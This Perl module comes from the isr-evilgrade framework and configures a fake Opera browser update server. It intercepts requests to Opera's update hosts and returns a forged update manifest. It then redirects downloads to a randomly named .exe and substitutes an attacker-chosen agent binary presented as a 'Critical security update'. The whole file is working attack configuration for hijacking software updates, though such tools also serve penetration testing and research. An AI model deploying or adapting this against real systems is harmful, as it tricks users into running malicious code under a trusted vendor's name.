###############
# opera.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::opera;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'Opera',
    'version'     => '1.0',
    'appver'      => '< 9.51',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(xml.opera.com|www.opera.com)',
    'request'     => [
        {   'req'    => '/update/?',    #regex friendly
            'type'   => 'file',         #file|string|agent|install
            'method' => '',             #any
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,
            'file' => './include/opera/opera_update.xml',
        },
        {   'req'     => '/download',               #regex anything
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://www.opera.com/operaupdate<%RND1%>.exe \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req'    => '.exe',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'description' => {
            'val'  => 'Critical security update',
            'desc' => 'Description display in the update'
        },
        'version' => {
            'val' =>
                '\'1\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
